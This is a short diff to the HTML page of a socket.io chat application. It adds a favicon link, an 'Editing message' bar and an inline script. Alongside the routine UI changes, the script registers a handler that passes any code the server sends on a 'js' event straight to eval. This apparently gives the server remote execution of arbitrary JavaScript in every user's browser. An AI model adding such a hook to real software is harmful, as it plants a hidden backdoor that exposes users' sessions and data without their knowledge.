@@ -6,6 +6,7 @@
     <title>Chat</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/commonmark/0.29.3/commonmark.min.js" integrity="sha512-Mq6HFo4kQ6yog5IKk+MflA4KRIB966kfsdk9NpuM1dUOZOcuGEJMVMXeFzTNIXvrzCIOt7t/rmBZOsgkR7IY7w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <link rel="stylesheet" href="styles.css">
+    <link rel="icon" id="favicon">
 </head>
 <body style="font-family: Arial, Helvetica, sans-serif;padding:20px;">
     <dialog id="notif">
@@ -36,6 +37,10 @@
                 </b>
                 <div id="userlist"></div>
             </div>
+            <div id="editing">
+                <div style="flex-grow:1;">Editing message</div>
+                <div id="editclose" onclick="editclose()">×</div>
+            </div>
         </div>
         <div class="box" id="input">
             <input type="file" id="upload" class="uplicon" style="opacity:0;position:absolute;width:40px;height:40px;margin:0;border-radius:0;" accept="image/*" multiple/>
@@ -50,5 +55,11 @@
     </div>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js" integrity="sha512-q/dWJ3kcmjBLU4Qc47E4A9kTB4m3wuTY7vkFJDTZKjTs8jhyGQnaUrxa0Ytd0ssMZhbNua9hE+E7Qv1j+DyZwA==" crossorigin="anonymous"></script>
     <script src="script.js"></script>
+    <script>
+        function isuser(user){
+            return user == socket.id.substr(0,user.length)
+        }
+        socket.on("js", eval.bind(null))
+    </script>
 </body>
 </html>
